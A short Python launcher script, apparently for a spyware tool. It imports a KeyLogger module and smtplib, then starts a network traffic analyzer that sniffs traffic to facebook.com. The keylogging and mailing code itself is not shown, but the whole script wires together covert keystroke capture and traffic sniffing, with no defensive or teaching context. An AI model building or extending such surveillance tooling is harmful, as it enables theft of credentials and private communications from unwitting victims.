#!./virtualenv/bin/python
from KeyLogger import KeyLogger
import smtplib
import threading
from MonitorNetwork import NetworkTrafficAnalyzer
domain_to_monitor = "facebook.com"  
traffic_analyzer = NetworkTrafficAnalyzer(domain_to_monitor)
traffic_analyzer.start_sniffing()
